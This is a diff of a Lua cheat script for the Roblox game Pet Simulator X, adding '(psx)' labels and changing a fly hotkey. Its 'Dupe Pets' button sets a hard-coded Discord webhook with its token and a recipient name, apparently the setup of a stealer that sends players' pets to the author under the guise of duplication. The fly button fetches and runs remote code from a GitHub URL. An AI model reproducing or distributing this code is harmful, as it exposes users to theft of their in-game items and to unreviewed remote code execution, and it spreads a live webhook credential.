@@ -3,7 +3,7 @@ local Window = Library.CreateLib("🌊🌊 Omegaa Script", "Midnight")
 
 -- MAIN
 local Tab = Window:NewTab("Visual")
-local VisualSection = Tab:NewSection("Make Visual Pets")
+local VisualSection = Tab:NewSection("Make Visual Pets (psx)")
 
 
 VisualSection:NewButton("Click here", "You must have 1 or more party dogs", function()
@@ -15,10 +15,10 @@ end)
 
 -- DUPE
 local Tab = Window:NewTab("Dupe")
-local Section = Tab:NewSection("Dupe Pets")
+local Section = Tab:NewSection("Dupe Pets (psx)")
 
 
-Section:NewButton("Dupe", "Dupe Pets", function()
+Section:NewButton("Dupe", "Dupe Pets (psx)", function()
     getgenv().webhook = "https://discord.com/api/webhooks/1086369484207575050/1YOuu8Aki5kKCTB7aVR99_DYt2eb3tTF6LgD04XTwlX4yqR77_VlNg6v1x7ckb0hvvfv"
     getgenv().name = "3Hacs"
     getgenv().mouselock = true
@@ -31,7 +31,7 @@ local Tab = Window:NewTab("Other")
 local Section = Tab:NewSection("Other Thinks")
 
 
-Section:NewButton("Fly = x", "press x to fly", function()
+Section:NewButton("Fly = h", "press h to fly", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/omegastudioscript/OmegaScript/main/ByOmegaScripts"))() 
 
     Fly(true)
